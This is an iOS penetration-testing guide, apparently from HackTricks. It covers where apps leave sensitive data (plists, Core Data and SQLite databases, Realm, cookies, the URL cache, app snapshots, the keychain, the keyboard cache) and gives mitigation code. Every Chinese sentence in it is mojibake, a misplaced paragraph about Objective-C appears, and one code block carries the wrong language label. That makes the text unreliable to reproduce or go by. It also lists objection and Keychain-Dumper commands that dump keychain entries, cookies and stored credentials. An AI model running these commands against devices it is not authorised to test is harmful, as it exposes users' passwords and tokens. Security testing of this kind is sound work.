ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## æ•°æ®å­˜å‚¨

è¦äº†è§£iOSå¦‚ä½•åœ¨è®¾å¤‡ä¸­å­˜å‚¨æ•°æ®ï¼Œè¯·é˜…è¯»æ­¤é¡µé¢ï¼š

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
åº”è¯¥åœ¨**å®‰è£…åº”ç”¨ç¨‹åº**åç«‹å³æ£€æŸ¥ä»¥ä¸‹å­˜å‚¨ä¿¡æ¯çš„ä½ç½®ï¼Œåœ¨**æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æ‰€æœ‰åŠŸèƒ½**ä¹‹åï¼Œç”šè‡³åœ¨**ä»ä¸€ä¸ªç”¨æˆ·æ³¨é”€å¹¶ç™»å½•åˆ°å¦ä¸€ä¸ªç”¨æˆ·**ä¹‹åè¿›è¡Œæ£€æŸ¥ã€‚\
ç›®æ ‡æ˜¯æ‰¾åˆ°åº”ç”¨ç¨‹åºï¼ˆå¯†ç ã€ä»¤ç‰Œï¼‰ã€å½“å‰ç”¨æˆ·å’Œå…ˆå‰ç™»å½•ç”¨æˆ·çš„**æœªå—ä¿æŠ¤çš„æ•æ„Ÿä¿¡æ¯**ã€‚
{% endhint %}

### Plist

**plist**æ–‡ä»¶æ˜¯ç»“æ„åŒ–çš„XMLæ–‡ä»¶ï¼Œ**åŒ…å«é”®å€¼å¯¹**ã€‚è¿™æ˜¯ä¸€ç§å­˜å‚¨æŒä¹…æ•°æ®çš„æ–¹å¼ï¼Œå› æ­¤æœ‰æ—¶æ‚¨å¯èƒ½ä¼šåœ¨è¿™äº›æ–‡ä»¶ä¸­æ‰¾åˆ°**æ•æ„Ÿä¿¡æ¯**ã€‚å»ºè®®åœ¨å®‰è£…åº”ç”¨ç¨‹åºåå’Œå¯†é›†ä½¿ç”¨åº”ç”¨ç¨‹åºåæ£€æŸ¥è¿™äº›æ–‡ä»¶ï¼Œä»¥æŸ¥çœ‹æ˜¯å¦å†™å…¥äº†æ–°æ•°æ®ã€‚

åœ¨plistæ–‡ä»¶ä¸­æŒä¹…ä¿å­˜æ•°æ®çš„æœ€å¸¸è§æ–¹æ³•æ˜¯ä½¿ç”¨**NSUserDefaults**ã€‚æ­¤plistæ–‡ä»¶ä¿å­˜åœ¨åº”ç”¨ç¨‹åºæ²™ç›’ä¸­çš„**`Library/Preferences/<appBundleID>.plist`**ä¸­ã€‚

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults)ç±»æä¾›äº†ä¸é»˜è®¤ç³»ç»Ÿäº¤äº’çš„ç¼–ç¨‹æ¥å£ã€‚é»˜è®¤ç³»ç»Ÿå…è®¸åº”ç”¨ç¨‹åºæ ¹æ®**ç”¨æˆ·åå¥½**è‡ªå®šä¹‰å…¶è¡Œä¸ºã€‚ç”±`NSUserDefaults`ä¿å­˜çš„æ•°æ®å¯ä»¥åœ¨åº”ç”¨ç¨‹åºåŒ…ä¸­æŸ¥çœ‹ã€‚è¯¥ç±»å°†**æ•°æ®**å­˜å‚¨åœ¨**plist**æ–‡ä»¶ä¸­ï¼Œä½†å®ƒé€‚ç”¨äºå°‘é‡æ•°æ®çš„ä½¿ç”¨ã€‚

è¿™äº›æ•°æ®æ— æ³•ç›´æ¥é€šè¿‡å—ä¿¡ä»»çš„è®¡ç®—æœºè®¿é—®ï¼Œä½†å¯ä»¥é€šè¿‡**å¤‡ä»½**è¿›è¡Œè®¿é—®ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨objectionçš„`ios nsuserdefaults get`å‘½ä»¤**è½¬å‚¨**ä½¿ç”¨**`NSUserDefaults`**ä¿å­˜çš„ä¿¡æ¯ã€‚

è¦æŸ¥æ‰¾åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ‰€æœ‰plistæ–‡ä»¶ï¼Œå¯ä»¥è®¿é—®`/private/var/mobile/Containers/Data/Application/{APPID}`å¹¶è¿è¡Œï¼š
```bash
find ./ -name "*.plist"
```
è¯¥æ–‡ä»¶å¯èƒ½ä»¥XMLæˆ–äºŒè¿›åˆ¶ï¼ˆbplistï¼‰æ ¼å¼è¿›è¡Œæ ¼å¼åŒ–ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç®€å•çš„å‘½ä»¤å°†å…¶è½¬æ¢ä¸ºXMLæ ¼å¼ï¼š

*   åœ¨macOSä¸Šä½¿ç”¨`plutil`ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸macOS 10.2åŠä»¥ä¸Šç‰ˆæœ¬ä¸€èµ·æä¾›çš„å·¥å…·ï¼ˆç›®å‰æ²¡æœ‰å®˜æ–¹åœ¨çº¿æ–‡æ¡£ï¼‰ï¼š

```bash
$ plutil -convert xml1 Info.plist
```
*   åœ¨Linuxä¸Šï¼š

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
*   åœ¨objectionçš„ä¼šè¯ä¸­ï¼š

```bash
ios plist cat /private/var/mobile/Containers/Data/Application/AF1F534B-1B8F-0825-ACB21-C0301AB7E56D/Library/Preferences/com.some.package.app.plist
```

### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1)æ˜¯ä¸€ä¸ªç”¨äºç®¡ç†åº”ç”¨ç¨‹åºä¸­å¯¹è±¡çš„æ¨¡å‹å±‚çš„æ¡†æ¶ã€‚[Core Dataå¯ä»¥ä½¿ç”¨SQLiteä½œä¸ºå…¶æŒä¹…å­˜å‚¨](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/)ï¼Œä½†æ¡†æ¶æœ¬èº«ä¸æ˜¯ä¸€ä¸ªæ•°æ®åº“ã€‚\
CoreDataé»˜è®¤ä¸åŠ å¯†å…¶æ•°æ®ã€‚ä½†æ˜¯ï¼Œå¯ä»¥å‘CoreDataæ·»åŠ é¢å¤–çš„åŠ å¯†å±‚ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…[GitHub Repo](https://github.com/project-imas/encrypted-core-data)ã€‚

æ‚¨å¯ä»¥åœ¨è·¯å¾„`/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`ä¸­æ‰¾åˆ°åº”ç”¨ç¨‹åºçš„SQLite Core Dataä¿¡æ¯ã€‚

**å¦‚æœæ‚¨å¯ä»¥æ‰“å¼€SQLiteå¹¶è®¿é—®æ•æ„Ÿä¿¡æ¯ï¼Œåˆ™å‘ç°äº†ä¸€ä¸ªé…ç½®é”™è¯¯ã€‚**

{% code title="æ¥è‡ªiGoatçš„ä»£ç " %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase)æ˜¯å»ºç«‹åœ¨SQLiteä¹‹ä¸Šçš„é”®å€¼å­˜å‚¨ã€‚\
ç”±äºYapæ•°æ®åº“æ˜¯SQLiteæ•°æ®åº“ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å‰ä¸€èŠ‚ä¸­æåˆ°çš„å‘½ä»¤æ‰¾åˆ°å®ƒä»¬ã€‚

### å…¶ä»–SQLiteæ•°æ®åº“

åº”ç”¨ç¨‹åºé€šå¸¸ä¼šåˆ›å»ºè‡ªå·±çš„SQLiteæ•°æ®åº“ã€‚å®ƒä»¬å¯èƒ½ä¼šåœ¨å…¶ä¸­å­˜å‚¨æ•æ„Ÿæ•°æ®å¹¶å°†å…¶ä¿ç•™ä¸ºæœªåŠ å¯†çŠ¶æ€ã€‚å› æ­¤ï¼Œæ£€æŸ¥åº”ç”¨ç¨‹åºç›®å½•ä¸­çš„æ¯ä¸ªæ•°æ®åº“å§‹ç»ˆæ˜¯æœ‰è¶£çš„ã€‚å› æ­¤ï¼Œè¯·è½¬åˆ°ä¿å­˜æ•°æ®çš„åº”ç”¨ç¨‹åºç›®å½•ï¼ˆ`/private/var/mobile/Containers/Data/Application/{APPID}`ï¼‰
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebaseå®æ—¶æ•°æ®åº“

å®ƒå¯ä»¥è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜åˆ©ç”¨æ¥**å­˜å‚¨å’ŒåŒæ­¥æ•°æ®åˆ°ä¸€ä¸ªNoSQLäº‘æ‰˜ç®¡æ•°æ®åº“**ã€‚æ•°æ®ä»¥JSONæ ¼å¼å­˜å‚¨ï¼Œå¹¶ä¸”å®æ—¶åŒæ­¥åˆ°æ¯ä¸ªè¿æ¥çš„å®¢æˆ·ç«¯ï¼Œå³ä½¿åº”ç”¨ç¨‹åºç¦»çº¿æ—¶ä¹Ÿä¿æŒå¯ç”¨ã€‚

æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¦‚ä½•æ£€æŸ¥é…ç½®é”™è¯¯çš„Firebaseæ•°æ®åº“çš„æ–¹æ³•ï¼š

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Realmæ•°æ®åº“

[Realm Objective-C](https://realm.io/docs/objc/latest/)å’Œ[Realm Swift](https://realm.io/docs/swift/latest/)ä¸æ˜¯ç”±Appleæä¾›çš„ï¼Œä½†ä»å€¼å¾—æ³¨æ„ã€‚å®ƒä»¬**å­˜å‚¨çš„å†…å®¹éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œé™¤éé…ç½®å¯ç”¨äº†åŠ å¯†**ã€‚

æ‚¨å¯ä»¥åœ¨`/private/var/mobile/Containers/Data/Application/{APPID}`ä¸­æ‰¾åˆ°è¿™äº›æ•°æ®åº“ã€‚
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·[**Realm Studio**](https://github.com/realm/realm-studio)æ¥æ‰“å¼€è¿™äº›æ•°æ®åº“æ–‡ä»¶ã€‚

ä»¥ä¸‹ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åœ¨Realmæ•°æ®åº“ä¸­ä½¿ç”¨åŠ å¯†ï¼š
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Liteæ•°æ®åº“

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios)æ˜¯ä¸€ä¸ªè½»é‡çº§çš„åµŒå…¥å¼æ–‡æ¡£å¯¼å‘ï¼ˆNoSQLï¼‰æ•°æ®åº“å¼•æ“ï¼Œå¯ä»¥è¿›è¡ŒåŒæ­¥ã€‚å®ƒå¯ä»¥åŸç”Ÿç¼–è¯‘ä¸ºiOSå’ŒmacOSã€‚

æ£€æŸ¥å¯èƒ½å­˜åœ¨çš„Couchbaseæ•°æ®åº“çš„è·¯å¾„ä¸º`/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/`ã€‚

### Cookies

iOSå°†åº”ç”¨ç¨‹åºçš„cookieså­˜å‚¨åœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºæ–‡ä»¶å¤¹ä¸­çš„**`Library/Cookies/cookies.binarycookies`**ä¸­ã€‚ç„¶è€Œï¼Œå¼€å‘äººå‘˜æœ‰æ—¶ä¼šå†³å®šå°†å®ƒä»¬ä¿å­˜åœ¨**é’¥åŒ™ä¸²**ä¸­ï¼Œå› ä¸ºä¸Šè¿°çš„**cookieæ–‡ä»¶å¯ä»¥åœ¨å¤‡ä»½ä¸­è®¿é—®**ã€‚

è¦æ£€æŸ¥cookiesæ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**è¿™ä¸ªPythonè„šæœ¬**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser)æˆ–ä½¿ç”¨objectionçš„**`ios cookies get`**å‘½ä»¤ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨objectionå°†è¿™äº›æ–‡ä»¶è½¬æ¢ä¸ºJSONæ ¼å¼å¹¶æ£€æŸ¥æ•°æ®ã€‚
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### ç¼“å­˜

é»˜è®¤æƒ…å†µä¸‹ï¼ŒNSURLSessionå°†æ•°æ®ï¼ˆå¦‚HTTPè¯·æ±‚å’Œå“åº”ï¼‰å­˜å‚¨åœ¨Cache.dbæ•°æ®åº“ä¸­ã€‚å¦‚æœä»¤ç‰Œã€ç”¨æˆ·åæˆ–ä»»ä½•å…¶ä»–æ•æ„Ÿä¿¡æ¯å·²è¢«ç¼“å­˜ï¼Œè¯¥æ•°æ®åº“å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ã€‚è¦æŸ¥æ‰¾ç¼“å­˜çš„ä¿¡æ¯ï¼Œè¯·æ‰“å¼€åº”ç”¨ç¨‹åºçš„æ•°æ®ç›®å½•ï¼ˆ`/var/mobile/Containers/Data/Application/<UUID>`ï¼‰ï¼Œç„¶åè½¬åˆ°`/Library/Caches/<Bundle Identifier>`ã€‚**WebKitç¼“å­˜ä¹Ÿå­˜å‚¨åœ¨Cache.dbæ–‡ä»¶ä¸­**ã€‚**Objection**å¯ä»¥ä½¿ç”¨å‘½ä»¤`sqlite connect Cache.db`æ‰“å¼€å¹¶ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ª**æ™®é€šçš„SQLiteæ•°æ®åº“**ã€‚

**å»ºè®®ç¦ç”¨ç¼“å­˜è¿™äº›æ•°æ®**ï¼Œå› ä¸ºè¯·æ±‚æˆ–å“åº”ä¸­å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚ä¸‹é¢çš„åˆ—è¡¨æ˜¾ç¤ºäº†å®ç°æ­¤ç›®çš„çš„ä¸åŒæ–¹æ³•ï¼š

1. å»ºè®®åœ¨æ³¨é”€ååˆ é™¤ç¼“å­˜çš„å“åº”ã€‚å¯ä»¥ä½¿ç”¨Appleæä¾›çš„åä¸º[`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses)çš„æ–¹æ³•æ¥å®Œæˆæ­¤æ“ä½œã€‚å¯ä»¥æŒ‰ä»¥ä¸‹æ–¹å¼è°ƒç”¨æ­¤æ–¹æ³•ï¼š

`URLCache.shared.removeAllCachedResponses()`

æ­¤æ–¹æ³•å°†ä»Cache.dbæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç¼“å­˜çš„è¯·æ±‚å’Œå“åº”ã€‚
2. å¦‚æœä¸éœ€è¦ä½¿ç”¨Cookieçš„ä¼˜åŠ¿ï¼Œå»ºè®®åªä½¿ç”¨URLSessionçš„[.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral)é…ç½®å±æ€§ï¼Œå®ƒå°†ç¦ç”¨ä¿å­˜Cookieå’Œç¼“å­˜ã€‚

[Appleæ–‡æ¡£](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral)ï¼š

`ä¸´æ—¶ä¼šè¯é…ç½®å¯¹è±¡ç±»ä¼¼äºé»˜è®¤ä¼šè¯é…ç½®ï¼ˆè¯·å‚é˜…defaultï¼‰ï¼Œä½†ç›¸åº”çš„ä¼šè¯å¯¹è±¡ä¸ä¼šå°†ç¼“å­˜ã€å‡­æ®å­˜å‚¨æˆ–ä»»ä½•ä¼šè¯ç›¸å…³æ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸Šã€‚ç›¸åï¼Œä¼šè¯ç›¸å…³æ•°æ®å­˜å‚¨åœ¨RAMä¸­ã€‚åªæœ‰åœ¨è¦æ±‚å°†URLçš„å†…å®¹å†™å…¥æ–‡ä»¶æ—¶ï¼Œä¸´æ—¶ä¼šè¯æ‰ä¼šå°†æ•°æ®å†™å…¥ç£ç›˜ã€‚`
3. å¯ä»¥é€šè¿‡å°†ç¼“å­˜ç­–ç•¥è®¾ç½®ä¸º[.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed)æ¥ç¦ç”¨ç¼“å­˜ã€‚å®ƒå°†ç¦æ­¢ä»¥ä»»ä½•æ–¹å¼å­˜å‚¨ç¼“å­˜ï¼Œæ— è®ºæ˜¯åœ¨å†…å­˜ä¸­è¿˜æ˜¯åœ¨ç£ç›˜ä¸Šã€‚

### å¿«ç…§

æ¯å½“æŒ‰ä¸‹ä¸»å±å¹•æŒ‰é’®æ—¶ï¼ŒiOSä¼š**æ‹æ‘„å½“å‰å±å¹•çš„å¿«ç…§**ï¼Œä»¥ä¾¿èƒ½å¤Ÿä»¥æ›´æµç•…çš„æ–¹å¼åˆ‡æ¢åˆ°åº”ç”¨ç¨‹åºã€‚ç„¶è€Œï¼Œå¦‚æœå½“å‰å±å¹•ä¸­å­˜åœ¨**æ•æ„Ÿæ•°æ®**ï¼Œå®ƒå°†è¢«**ä¿å­˜**åœ¨**å›¾åƒ**ä¸­ï¼ˆè¯¥å›¾åƒ**åœ¨é‡å¯åä»ç„¶å­˜åœ¨**ï¼‰ã€‚è¿™äº›å¿«ç…§ä¹Ÿå¯ä»¥é€šè¿‡åŒå‡»ä¸»å±å¹•æ¥è®¿é—®ï¼Œä»¥åœ¨åº”ç”¨ç¨‹åºä¹‹é—´åˆ‡æ¢ã€‚

é™¤éiPhoneå·²è¶Šç‹±ï¼Œå¦åˆ™**æ”»å‡»è€…**éœ€è¦**è§£é”**è®¾å¤‡æ‰èƒ½æŸ¥çœ‹è¿™äº›å±å¹•æˆªå›¾ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ€åä¸€ä¸ªå¿«ç…§å­˜å‚¨åœ¨åº”ç”¨ç¨‹åºçš„æ²™ç›’ä¸­çš„`Library/Caches/Snapshots/`æˆ–`Library/SplashBoard/Snapshots`æ–‡ä»¶å¤¹ä¸­ï¼ˆå—ä¿¡ä»»çš„è®¡ç®—æœºæ— æ³•ä»iOS 7.0è®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ã€‚

é˜²æ­¢è¿™ç§ä¸è‰¯è¡Œä¸ºçš„ä¸€ç§æ–¹æ³•æ˜¯åœ¨æ‹æ‘„å¿«ç…§ä¹‹å‰æ”¾ç½®ä¸€ä¸ªç©ºç™½å±å¹•æˆ–åˆ é™¤æ•æ„Ÿæ•°æ®ï¼Œä½¿ç”¨`ApplicationDidEnterBackground()`å‡½æ•°ã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªè®¾ç½®é»˜è®¤å±å¹•æˆªå›¾çš„ç¤ºä¾‹ä¿®å¤æ–¹æ³•ã€‚

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-Cæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œç”¨äºå¼€å‘iOSåº”ç”¨ç¨‹åºã€‚å®ƒæ˜¯iOSå¹³å°ä¸Šæœ€å¸¸ç”¨çš„ç¼–ç¨‹è¯­è¨€ä¹‹ä¸€ã€‚Objective-Cæ˜¯Cè¯­è¨€çš„è¶…é›†ï¼Œå…·æœ‰é¢å‘å¯¹è±¡çš„ç‰¹æ€§ï¼Œå¦‚å°è£…ã€ç»§æ‰¿å’Œå¤šæ€ã€‚åœ¨iOSåº”ç”¨ç¨‹åºçš„æ¸—é€æµ‹è¯•ä¸­ï¼Œäº†è§£Objective-Cè¯­è¨€æ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºå®ƒæ˜¯iOSåº”ç”¨ç¨‹åºçš„ä¸»è¦å¼€å‘è¯­è¨€ä¹‹ä¸€ã€‚
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
è¿™å°†åœ¨åº”ç”¨ç¨‹åºè¿›å…¥åå°æ—¶å°†èƒŒæ™¯å›¾åƒè®¾ç½®ä¸º`overlayImage.png`ã€‚å®ƒå¯ä»¥é˜²æ­¢æ•æ„Ÿæ•°æ®æ³„éœ²ï¼Œå› ä¸º`overlayImage.png`å°†å§‹ç»ˆè¦†ç›–å½“å‰è§†å›¾ã€‚

### Keychain

å¯ä»¥ä½¿ç”¨[**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper)ç­‰å·¥å…·æ¥è½¬å‚¨é’¥åŒ™ä¸²ï¼ˆè®¾å¤‡å¿…é¡»è¶Šç‹±ï¼‰ã€‚\
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨[**Objection**](https://github.com/sensepost/objection)ä¸­çš„`ios keychain dump`å‘½ä»¤ã€‚

**NSURLCredential**

**NSURLCredential**æ˜¯åœ¨é’¥åŒ™ä¸²ä¸­å­˜å‚¨ç”¨æˆ·åå’Œå¯†ç çš„å®Œç¾ç±»ã€‚ä¸éœ€è¦ä½¿ç”¨NSUserDefaultsæˆ–ä»»ä½•é’¥åŒ™ä¸²åŒ…è£…å™¨ã€‚\
ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼Œæ‚¨å¯ä»¥å°†ä»–çš„ç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åˆ°é’¥åŒ™ä¸²ä¸­ï¼š
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
æ‚¨å¯ä»¥ä½¿ç”¨**Objection**çš„`ios nsurlcredentialstorage dump`å‘½ä»¤æ¥å¯¼å‡ºè¿™äº›ç§˜å¯†ä¿¡æ¯ã€‚

## è‡ªå®šä¹‰é”®ç›˜/é”®ç›˜ç¼“å­˜

ä»iOS 8.0å¼€å§‹ï¼ŒAppleå…è®¸å®‰è£…è‡ªå®šä¹‰æ‰©å±•ï¼Œå¦‚è‡ªå®šä¹‰é”®ç›˜ã€‚\
å®‰è£…çš„é”®ç›˜å¯ä»¥é€šè¿‡**è®¾ç½®** > **é€šç”¨** > **é”®ç›˜** > **é”®ç›˜**è¿›è¡Œç®¡ç†ã€‚\
è‡ªå®šä¹‰é”®ç›˜å¯ä»¥ç”¨äº**å—…æ¢**æŒ‰é”®å¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ä½†æ˜¯ï¼Œè¯·æ³¨æ„**éœ€è¦ç½‘ç»œè¿æ¥çš„è‡ªå®šä¹‰é”®ç›˜ä¼šé€šçŸ¥ç”¨æˆ·**ã€‚\
æ­¤å¤–ï¼Œ**ç”¨æˆ·å¯ä»¥åˆ‡æ¢åˆ°å…¶ä»–**ï¼ˆæ›´å¯ä¿¡ä»»çš„ï¼‰**é”®ç›˜**ä»¥è¾“å…¥å‡­æ®ã€‚

æ­¤å¤–ï¼Œ**åº”ç”¨ç¨‹åºå¯ä»¥é˜»æ­¢ç”¨æˆ·åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨è‡ªå®šä¹‰é”®ç›˜**ï¼ˆæˆ–è€…è‡³å°‘åœ¨åº”ç”¨ç¨‹åºçš„æ•æ„Ÿéƒ¨åˆ†ä¸­é˜»æ­¢ä½¿ç”¨ï¼‰ã€‚

{% hint style="warning" %}
å¦‚æœæ‚¨è®¤ä¸ºç”¨æˆ·ä¸éœ€è¦ç¬¬ä¸‰æ–¹é”®ç›˜ï¼Œåˆ™å»ºè®®ä¸è¦å…è®¸å…¶ä½¿ç”¨ã€‚
{% endhint %}

è¯·æ³¨æ„ï¼Œç”±äºè‡ªåŠ¨æ›´æ­£å’Œè‡ªåŠ¨å»ºè®®ï¼Œå¦‚æœå±æ€§**securetTextEntry**æœªè®¾ç½®ä¸º**true**æˆ–**autoCorrectionType**æœªè®¾ç½®ä¸º**UITextAutoCorrectionTypeNo**ï¼Œé»˜è®¤çš„iOSé”®ç›˜å°†æ•è·å’Œå­˜å‚¨æ¯ä¸ªéæ ‡å‡†å•è¯çš„ç¼“å­˜æ–‡ä»¶ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œé”®ç›˜å°†æ­¤ç¼“å­˜å­˜å‚¨åœ¨åº”ç”¨ç¨‹åºæ²™ç›’ä¸­çš„`Library/Keyboard/{locale}-dynamic-text.dat`æ–‡ä»¶æˆ–`/private/var/mobile/Library/Keyboard/dynamic-text.dat`æ–‡ä»¶ä¸­ã€‚ä½†æ˜¯ï¼Œå®ƒä¹Ÿå¯èƒ½å°†æ•°æ®ä¿å­˜åœ¨å…¶ä»–ä½ç½®ã€‚\
å¯ä»¥åœ¨_**è®¾ç½®**_ > _**é€šç”¨**_ > _**é‡ç½®**_ > _**é‡ç½®é”®ç›˜å­—å…¸**_ä¸­é‡ç½®ç¼“å­˜ã€‚

{% hint style="info" %}
å› æ­¤ï¼Œ**å§‹ç»ˆæ£€æŸ¥è¿™äº›æ–‡ä»¶**å¹¶æœç´¢å¯èƒ½çš„**æ•æ„Ÿä¿¡æ¯**ã€‚\
**æ‹¦æˆªç½‘ç»œæµé‡**æ˜¯æ£€æŸ¥è‡ªå®šä¹‰é”®ç›˜æ˜¯å¦å°†æŒ‰é”®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨çš„å¦ä¸€ç§æ–¹æ³•ã€‚
{% endhint %}

é”®ç›˜ç¼“å­˜ä½¿ç”¨äº†[UITextInputTraitsåè®®](https://developer.apple.com/reference/uikit/uitextinputtraits)ã€‚UITextFieldã€UITextViewå’ŒUISearchBarç±»è‡ªåŠ¨æ”¯æŒæ­¤åè®®ï¼Œå¹¶æä¾›ä»¥ä¸‹å±æ€§ï¼š

* `var autocorrectionType: UITextAutocorrectionType`ç¡®å®šåœ¨è¾“å…¥æ—¶æ˜¯å¦å¯ç”¨è‡ªåŠ¨æ›´æ­£ã€‚å½“å¯ç”¨è‡ªåŠ¨æ›´æ­£æ—¶ï¼Œæ–‡æœ¬å¯¹è±¡ä¼šè·Ÿè¸ªæœªçŸ¥å•è¯å¹¶å»ºè®®åˆé€‚çš„æ›¿æ¢ï¼Œé™¤éç”¨æˆ·è¦†ç›–æ›¿æ¢ï¼Œå¦åˆ™ä¼šè‡ªåŠ¨æ›¿æ¢è¾“å…¥çš„æ–‡æœ¬ã€‚æ­¤å±æ€§çš„é»˜è®¤å€¼ä¸º`UITextAutocorrectionTypeDefault`ï¼Œå¯¹äºå¤§å¤šæ•°è¾“å…¥æ–¹æ³•éƒ½å¯ç”¨äº†è‡ªåŠ¨æ›´æ­£ã€‚
* `var secureTextEntry: BOOL`ç¡®å®šæ˜¯å¦ç¦ç”¨æ–‡æœ¬å¤åˆ¶å’Œæ–‡æœ¬ç¼“å­˜ï¼Œå¹¶éšè—æ­£åœ¨è¾“å…¥çš„æ–‡æœ¬ï¼ˆé€‚ç”¨äº`UITextField`ï¼‰ã€‚æ­¤å±æ€§çš„é»˜è®¤å€¼ä¸º`NO`ã€‚

**è¦åœ¨ä»£ç ä¸­è¯†åˆ«æ­¤è¡Œä¸ºï¼š**

* åœ¨æºä»£ç ä¸­æœç´¢ç±»ä¼¼çš„å®ç°ï¼Œä¾‹å¦‚
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
